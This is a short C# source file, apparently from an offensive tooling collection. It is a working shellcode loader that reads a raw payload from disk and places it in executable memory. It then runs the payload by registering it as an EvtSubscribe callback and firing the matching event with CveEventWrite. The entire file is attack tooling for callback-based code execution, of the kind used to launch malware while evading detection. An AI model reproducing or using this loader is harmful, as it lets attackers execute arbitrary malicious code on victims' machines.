// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EvtSubscribe_CVEEventWrite
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: EvtSubscribe_CVEEventWrite.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            uint EvtSubscribeToFutureEvents = 1;
            IntPtr hEvent = EvtSubscribe(IntPtr.Zero, IntPtr.Zero, "Application", "*[System/EventID=1]", IntPtr.Zero, IntPtr.Zero, hAlloc, EvtSubscribeToFutureEvents);
            long test = CveEventWrite("2022-123456", "Wra7h");
            System.Threading.Thread.Sleep(10000);
            EvtClose(hEvent);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Wevtapi.dll")]
        static extern IntPtr EvtSubscribe(
            IntPtr hSession,
            IntPtr SignalEvent,
            [MarshalAs(UnmanagedType.LPWStr)] string ChannelPath,
            [MarshalAs(UnmanagedType.LPWStr)] string Query,
            IntPtr Bookmark,
            IntPtr Context,
            IntPtr Callback,
            uint Flags);

        [DllImport("Advapi32.dll")]
        static extern long CveEventWrite(string CveId, string AdditionalDetails);

        [DllImport("Wevtapi.dll")]
        static extern bool EvtClose(IntPtr hEvent);
    }
}
